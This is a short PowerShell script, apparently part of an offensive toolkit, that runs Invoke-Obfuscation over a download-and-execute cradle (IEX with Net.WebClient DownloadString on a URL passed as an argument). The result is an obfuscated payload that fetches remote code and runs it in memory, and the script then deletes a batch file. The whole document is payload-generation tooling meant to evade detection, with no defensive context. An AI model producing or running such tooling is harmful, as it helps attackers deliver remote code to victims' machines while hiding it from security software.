# Generate obfuscated payload
$tx=$args[0]
$cd=$args[1]
$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path

function runObfuscate {
	Import-Module "$ScriptDir\Build\obfuscator\Invoke-Obfuscation.psd1"
	Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString($tx)} -Command $cd -Quiet
	}
runObfuscate
del $ScriptDir\obf.bat
